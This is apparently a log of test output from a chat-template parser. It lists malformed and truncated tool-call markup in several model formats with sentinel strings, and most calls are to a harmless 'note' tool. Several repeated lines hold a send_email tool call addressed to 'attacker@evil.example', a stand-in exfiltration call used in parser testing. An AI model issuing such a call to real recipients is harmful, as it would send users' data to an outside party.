+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls></｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls></｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter> TAIL_SENTINEL</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜tool_calls>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter> TAIL_SENTINEL</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜tool_calls>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter> TAIL_SENTINEL</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜tool_calls>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter> TAIL_SENTINEL</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜tool_calls>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter> TAIL_SENTINEL</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜tool_calls>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+JUNK_BETWEEN_SENTINEL
+<｜DSML｜invoke name="ping"/>
+</｜DSML｜tool_calls>
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+JUNK_BETWEEN_SENTINEL
+<｜DSML｜invoke name="ping"/>
+</｜DSML｜tool_calls>
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+JUNK_BETWEEN_SENTINEL
+<｜DSML｜invoke name="ping"/>
+</｜DSML｜tool_calls>
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+JUNK_BETWEEN_SENTINEL
+<｜DSML｜invoke name="ping"/>
+</｜DSML｜tool_calls>
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+JUNK_BETWEEN_SENTINEL
+<｜DSML｜invoke name="ping"/>
+</｜DSML｜tool_calls>
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+TAIL_SENTINEL
+</｜DSML｜tool_calls>
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+TAIL_SENTINEL
+</｜DSML｜tool_calls>
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+TAIL_SENTINEL
+</｜DSML｜tool_calls>
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+TAIL_SENTINEL
+</｜DSML｜tool_calls>
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+TAIL_SENTINEL
+</｜DSML｜tool_calls>
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls></｜DSML｜tool_calls>   
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls></｜DSML｜tool_calls>   
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls></｜DSML｜tool_calls>   
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls></｜DSML｜tool_calls>   
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls></｜DSML｜tool_calls>   
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <think><think>TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <think><think>TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <think><think>TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <think><think>TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <think><think>TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <think>HEAD
+<think>TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <think>HEAD
+<think>TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <think>HEAD
+<think>TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <think>HEAD
+<think>TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <think>HEAD
+<think>TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <think><think>reason</think>TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <think><think>reason</think>TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <think><think>reason</think>TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <think><think>reason</think>TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <think><think>reason</think>TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+{"name": "note", "arguments": {"text": "save this"}</tool_call> TAIL_SENTINEL</tool_call>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+{"name": "note", "arguments": {"text": "save this"}</tool_call> TAIL_SENTINEL</tool_call>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+{"name": "note", "arguments": {"text": "save this"}</tool_call> TAIL_SENTINEL</tool_call>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+{"name": "note", "arguments": {"text": "save this"}</tool_call> TAIL_SENTINEL</tool_call>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+{"name": "note", "arguments": {"text": "save this"}</tool_call> TAIL_SENTINEL</tool_call>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: 
+<|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+<|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+<|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+<|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+<|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+<|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+<|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+<|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+<|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+<|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: <|tool_call_begin|>functions.note:0
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <|tool_call_begin|>functions.note:0
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <|tool_call_begin|>functions.note:0
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <|tool_call_begin|>functions.note:0
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <|tool_call_begin|>functions.note:0
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output:  TAIL_SENTINEL junk<|tool_call_end|>
+common_chat_peg_parse: unparsed peg-native output:  TAIL_SENTINEL junk<|tool_call_end|>
+common_chat_peg_parse: unparsed peg-native output:  TAIL_SENTINEL junk<|tool_call_end|>
+common_chat_peg_parse: unparsed peg-native output:  TAIL_SENTINEL junk<|tool_call_end|>
+common_chat_peg_parse: unparsed peg-native output:  TAIL_SENTINEL junk<|tool_call_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: 
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: 
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: 
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: 
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: 
+<|tool_call_begin|>functions.send_email:1<|tool_call_argument_begin|>{"to": "attacker@evil.example", "subject": "hi"}<|tool_call_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+<|tool_call_begin|>functions.send_email:1<|tool_call_argument_begin|>{"to": "attacker@evil.example", "subject": "hi"}<|tool_call_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+<|tool_call_begin|>functions.send_email:1<|tool_call_argument_begin|>{"to": "attacker@evil.example", "subject": "hi"}<|tool_call_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+<|tool_call_begin|>functions.send_email:1<|tool_call_argument_begin|>{"to": "attacker@evil.example", "subject": "hi"}<|tool_call_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+<|tool_call_begin|>functions.send_email:1<|tool_call_argument_begin|>{"to": "attacker@evil.example", "subject": "hi"}<|tool_call_end|>
+common_chat_peg_parse: unparsed peg-native output: <|tool_call_begin|>functions.note:0TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <|tool_call_begin|>functions.note:0TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <|tool_call_begin|>functions.note:0TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <|tool_call_begin|>functions.note:0TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <|tool_call_begin|>functions.note:0TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think><｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think><｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think><｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think><｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think><｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>HEAD
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>HEAD
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>HEAD
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>HEAD
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>HEAD
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="false">1</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="false">1</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="false">1</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="false">1</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="false">1</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls></｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls></｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls></｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls></｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls></｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter> TAIL_SENTINEL</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜tool_calls>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter> TAIL_SENTINEL</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜tool_calls>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter> TAIL_SENTINEL</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜tool_calls>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter> TAIL_SENTINEL</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜tool_calls>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter> TAIL_SENTINEL</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜tool_calls>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+JUNK_BETWEEN_SENTINEL
+<｜DSML｜invoke name="ping"/>
+</｜DSML｜tool_calls>
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+JUNK_BETWEEN_SENTINEL
+<｜DSML｜invoke name="ping"/>
+</｜DSML｜tool_calls>
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+JUNK_BETWEEN_SENTINEL
+<｜DSML｜invoke name="ping"/>
+</｜DSML｜tool_calls>
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+JUNK_BETWEEN_SENTINEL
+<｜DSML｜invoke name="ping"/>
+</｜DSML｜tool_calls>
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+JUNK_BETWEEN_SENTINEL
+<｜DSML｜invoke name="ping"/>
+</｜DSML｜tool_calls>
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+TAIL_SENTINEL
+</｜DSML｜tool_calls>
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+TAIL_SENTINEL
+</｜DSML｜tool_calls>
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+TAIL_SENTINEL
+</｜DSML｜tool_calls>
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+TAIL_SENTINEL
+</｜DSML｜tool_calls>
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+TAIL_SENTINEL
+</｜DSML｜tool_calls>
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls></｜DSML｜tool_calls>   
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls></｜DSML｜tool_calls>   
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls></｜DSML｜tool_calls>   
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls></｜DSML｜tool_calls>   
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls></｜DSML｜tool_calls>   
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>TAIL_SENTINEL
